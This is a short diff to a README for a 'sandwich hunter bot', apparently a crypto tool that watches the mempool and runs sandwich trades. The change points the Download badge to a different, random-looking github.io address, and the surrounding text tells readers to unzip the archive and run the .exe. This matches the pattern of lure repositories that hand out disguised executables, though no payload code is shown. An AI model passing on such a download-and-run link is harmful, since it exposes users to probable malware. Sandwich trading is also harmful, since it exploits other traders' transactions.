@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` (or run via Python if provided) — the bot will automatically configure logs and be ready for mempool monitoring and sandwich execution.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://sandwich-hunter-bot.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://alessiomar7laonk37ovi4c.github.io/.github/sandwich-hunter-bot)
 
 ## ​ Overview
 A quick look at key parts in action:
